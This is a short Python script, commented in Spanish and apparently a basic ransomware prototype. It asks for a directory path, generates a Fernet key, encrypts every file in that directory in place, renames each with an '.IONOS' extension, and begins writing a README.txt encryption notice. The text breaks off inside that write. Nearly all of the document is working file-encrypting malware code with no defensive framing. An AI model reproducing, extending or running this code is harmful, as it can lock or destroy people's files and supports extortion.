from cryptography.fernet import Fernet
import os



# ext para archivos que van a encriptar
extension = 'IONOS'


#  Generacion de clave y guardarla dentro del mismo archivo que se crea para encriptar
def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)


#  funcion que lee la llave generada 
def cargar_key():
    return open('key.key', 'rb').read()


# ENcriptar archivos y colocar la extencion elegida. 
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)


if __name__ == '__main__':

    path = input ("Dame tu path a encriptar: ") 
    try:
        # Directorio que vamos a cifrar.
        path_to_encrypt = (path)

        # Obtenemos los archivos del directorio a cifrar  los guardamos en una lista.
        items = os.listdir(path_to_encrypt)
        full_path = [path_to_encrypt + '//' + item for item in items]

        # genrar llae que cifra y guardarla en variable
        generar_key()
        key = cargar_key()

        # Encripcion del path otorgado
        encrypt(full_path, key)

        # fichero de aviso de encripcion
        with open( path_to_encrypt + '\\README.txt', 'w') as file:
